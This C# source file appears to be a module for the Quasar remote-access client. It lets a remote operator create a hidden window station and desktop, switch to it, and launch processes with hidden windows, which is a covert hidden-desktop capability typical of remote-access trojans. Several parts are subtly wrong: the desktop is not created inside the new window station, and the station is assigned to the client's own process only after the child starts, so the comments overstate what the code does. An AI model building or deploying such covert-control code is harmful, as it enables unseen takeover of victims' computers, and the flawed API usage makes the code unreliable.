using Quasar.Common.Messages;
using Quasar.Common.Networking;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace Quasar.Client.Messages
{
    public class VirtualDesktopHandler : IMessageProcessor
    {
        private IntPtr _virtualDesktop = IntPtr.Zero;
        private IntPtr _virtualWindowStation = IntPtr.Zero;
        private bool _isVirtualSessionActive = false;

        public bool CanExecute(IMessage message) => message is DoCreateVirtualDesktop ||
                                                   message is DoSwitchToVirtualDesktop ||
                                                   message is DoDestroyVirtualDesktop ||
                                                   message is DoRunHiddenProcess;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoCreateVirtualDesktop msg:
                    Execute(sender, msg);
                    break;
                case DoSwitchToVirtualDesktop msg:
                    Execute(sender, msg);
                    break;
                case DoDestroyVirtualDesktop msg:
                    Execute(sender, msg);
                    break;
                case DoRunHiddenProcess msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, DoCreateVirtualDesktop message)
        {
            try
            {
                // Create a new Window Station
                _virtualWindowStation = NativeMethods.CreateWindowStation(
                    message.StationName, 
                    0, 
                    NativeMethods.WINSTA_ALL_ACCESS, 
                    IntPtr.Zero);

                if (_virtualWindowStation == IntPtr.Zero)
                {
                    client.Send(new SetStatus { Message = "Failed to create Window Station" });
                    return;
                }

                // Create a new Desktop within the Window Station
                _virtualDesktop = NativeMethods.CreateDesktop(
                    message.DesktopName,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    0,
                    NativeMethods.DESKTOP_ALL_ACCESS,
                    IntPtr.Zero);

                if (_virtualDesktop == IntPtr.Zero)
                {
                    NativeMethods.CloseWindowStation(_virtualWindowStation);
                    _virtualWindowStation = IntPtr.Zero;
                    client.Send(new SetStatus { Message = "Failed to create Virtual Desktop" });
                    return;
                }

                _isVirtualSessionActive = true;
                client.Send(new SetStatus { Message = $"Virtual Desktop '{message.DesktopName}' created successfully" });
            }
            catch (Exception ex)
            {
                client.Send(new SetStatus { Message = $"Error creating Virtual Desktop: {ex.Message}" });
            }
        }

        private void Execute(ISender client, DoSwitchToVirtualDesktop message)
        {
            if (!_isVirtualSessionActive || _virtualDesktop == IntPtr.Zero)
            {
                client.Send(new SetStatus { Message = "No Virtual Desktop available" });
                return;
            }

            try
            {
                // Switch to the virtual desktop
                if (NativeMethods.SwitchDesktop(_virtualDesktop))
                {
                    client.Send(new SetStatus { Message = "Switched to Virtual Desktop successfully" });
                }
                else
                {
                    client.Send(new SetStatus { Message = "Failed to switch to Virtual Desktop" });
                }
            }
            catch (Exception ex)
            {
                client.Send(new SetStatus { Message = $"Error switching to Virtual Desktop: {ex.Message}" });
            }
        }

        private void Execute(ISender client, DoDestroyVirtualDesktop message)
        {
            try
            {
                if (_virtualDesktop != IntPtr.Zero)
                {
                    NativeMethods.CloseDesktop(_virtualDesktop);
                    _virtualDesktop = IntPtr.Zero;
                }

                if (_virtualWindowStation != IntPtr.Zero)
                {
                    NativeMethods.CloseWindowStation(_virtualWindowStation);
                    _virtualWindowStation = IntPtr.Zero;
                }

                _isVirtualSessionActive = false;
                client.Send(new SetStatus { Message = "Virtual Desktop destroyed successfully" });
            }
            catch (Exception ex)
            {
                client.Send(new SetStatus { Message = $"Error destroying Virtual Desktop: {ex.Message}" });
            }
        }

        private void Execute(ISender client, DoRunHiddenProcess message)
        {
            if (!_isVirtualSessionActive || _virtualDesktop == IntPtr.Zero)
            {
                client.Send(new SetStatus { Message = "No Virtual Desktop available" });
                return;
            }

            try
            {
                // Create process info with hidden window
                var startInfo = new ProcessStartInfo
                {
                    FileName = message.FileName,
                    Arguments = message.Arguments,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    UseShellExecute = false
                };

                // Start process in virtual desktop
                var process = Process.Start(startInfo);
                
                if (process != null)
                {
                    // Set process to run in virtual desktop
                    NativeMethods.SetProcessWindowStation(_virtualWindowStation);
                    
                    client.Send(new SetStatus { Message = $"Hidden process started in Virtual Desktop: {process.Id}" });
                }
                else
                {
                    client.Send(new SetStatus { Message = "Failed to start hidden process" });
                }
            }
            catch (Exception ex)
            {
                client.Send(new SetStatus { Message = $"Error running hidden process: {ex.Message}" });
            }
        }
    }

    // Native Windows API declarations for Virtual Desktop
    internal static class NativeMethods
    {
        // Window Station constants
        public const uint WINSTA_ALL_ACCESS = 0x037F;
        public const uint WINSTA_ACCESSCLIPBOARD = 0x0004;
        public const uint WINSTA_ACCESSGLOBALATOMS = 0x0020;
        public const uint WINSTA_CREATEDESKTOP = 0x0008;
        public const uint WINSTA_ENUMDESKTOPS = 0x0001;
        public const uint WINSTA_ENUMERATE = 0x0100;
        public const uint WINSTA_EXITWINDOWS = 0x0040;
        public const uint WINSTA_READATTRIBUTES = 0x0002;
        public const uint WINSTA_READSCREEN = 0x0200;
        public const uint WINSTA_WRITEATTRIBUTES = 0x0010;

        // Desktop constants
        public const uint DESKTOP_ALL_ACCESS = 0x01FF;
        public const uint DESKTOP_CREATEMENU = 0x0004;
        public const uint DESKTOP_CREATEWINDOW = 0x0002;
        public const uint DESKTOP_ENUMERATE = 0x0040;
        public const uint DESKTOP_HOOKCONTROL = 0x0008;
        public const uint DESKTOP_JOURNALPLAYBACK = 0x0020;
        public const uint DESKTOP_JOURNALRECORD = 0x0010;
        public const uint DESKTOP_READOBJECTS = 0x0001;
        public const uint DESKTOP_SWITCHDESKTOP = 0x0100;
        public const uint DESKTOP_WRITEOBJECTS = 0x0080;

        [DllImport("user32.dll", SetLastError = true)]
        public static extern IntPtr CreateWindowStation(string lpwinsta, uint dwFlags, uint dwDesiredAccess, IntPtr lpsa);

        [DllImport("user32.dll", SetLastError = true)]
        public static extern IntPtr CreateDesktop(string lpszDesktop, IntPtr lpszDevice, IntPtr lpszDeviceMode, uint dwFlags, uint dwDesiredAccess, IntPtr lpsa);

        [DllImport("user32.dll", SetLastError = true)]
        public static extern bool SwitchDesktop(IntPtr hDesktop);

        [DllImport("user32.dll", SetLastError = true)]
        public static extern bool CloseDesktop(IntPtr handle);

        [DllImport("user32.dll", SetLastError = true)]
        public static extern bool CloseWindowStation(IntPtr handle);

        [DllImport("user32.dll", SetLastError = true)]
        public static extern IntPtr OpenWindowStation(string lpszWinSta, bool fInherit, uint dwDesiredAccess);

        [DllImport("user32.dll", SetLastError = true)]
        public static extern IntPtr OpenDesktop(string lpszDesktop, uint dwFlags, bool fInherit, uint dwDesiredAccess);

        [DllImport("user32.dll", SetLastError = true)]
        public static extern bool SetProcessWindowStation(IntPtr hWinSta);
    }
}
